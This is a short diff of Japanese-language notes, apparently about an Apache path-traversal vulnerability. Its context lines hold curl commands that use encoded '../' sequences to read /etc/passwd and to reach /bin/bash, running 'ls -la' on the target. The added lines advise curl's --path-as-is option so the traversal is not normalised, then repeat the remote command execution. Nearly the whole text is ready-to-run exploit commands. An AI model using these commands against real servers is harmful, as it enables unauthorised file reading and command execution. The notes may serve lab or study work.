@@ -16,3 +16,8 @@ curl http://IPアドレス:8081/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/p
 ```
 curl 'http://IPアドレス:8082/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; ls -la'
 ```
+
+curlがURLエンコードをデコードする場合があるので、そんな時は **--path-as-is** を使う。
+```
+curl --path-as-is 'http://IPアドレス:8082/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; ls -la'
+```
